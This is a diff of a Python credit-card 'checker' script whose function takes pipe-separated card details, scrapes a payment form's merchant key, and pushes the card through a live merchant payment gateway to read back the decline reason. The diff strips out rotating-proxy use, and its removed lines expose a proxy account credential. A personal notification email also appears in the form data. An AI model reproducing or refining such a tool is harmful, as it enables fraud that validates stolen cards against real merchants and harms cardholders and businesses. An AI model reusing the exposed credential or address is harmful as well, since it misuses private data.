@@ -1,9 +1,6 @@
 import requests,re
-from proxy import reqproxy, make_request
 def Tele(ccx):
-	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_184b6dff-zone-ccworld:tnkilbv66jns"
-	session, ip = reqproxy(proxy_str)
-	#print(f"IP Address: {ip}")
+	import requests
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -34,7 +31,7 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	response = session.get('https://acmetrustnevis.com/payment-form/', headers=headers)
+	response = requests.get('https://acmetrustnevis.com/payment-form/', headers=headers)
 	
 	MERCHKEY = re.search(r'name="MERCHKEY" value="(.*?)"', response.text).group(1)
 	#print(MERCHKEY)
@@ -76,7 +73,7 @@ def Tele(ccx):
 	    'action': 'four_csonline_submit_form',
 	}
 	
-	response = session.post('https://acmetrustnevis.com/wp-admin/admin-ajax.php', headers=headers, data=data)
+	response = requests.post('https://acmetrustnevis.com/wp-admin/admin-ajax.php', headers=headers, data=data)
 	
 	#print(response.text)
 	
@@ -115,7 +112,7 @@ def Tele(ccx):
 	    'notify_email': 'jc.boncamper@gmail.com',
 	}
 	
-	response = session.post('https://merchants.4csonline.com/TranSvcs/tp.aspx', headers=headers, data=data)
+	response = requests.post('https://merchants.4csonline.com/TranSvcs/tp.aspx', headers=headers, data=data)
 	
 	VIEWSTATE = re.search(r'name="__VIEWSTATE" id="__VIEWSTATE" value="(.*?)"', response.text).group(1)
 	#print(VIEWSTATE)
@@ -157,7 +154,7 @@ def Tele(ccx):
 	    'Continue': 'Continue',
 	}
 	
-	response = session.post('https://merchants.4csonline.com/TranSvcs/tp.aspx', headers=headers, data=data)
+	response = requests.post('https://merchants.4csonline.com/TranSvcs/tp.aspx', headers=headers, data=data)
 	
 	try:
 	    result = re.search(r'name="dc.description" content="Oh no! It seems like (.*?) You can try to&nbsp;complete the payment again&nbsp;if you think you entered your credit card information incorrectly. Please&nbsp;contact us&nbsp;if you believe there may be other issues."', response.text).group(1)
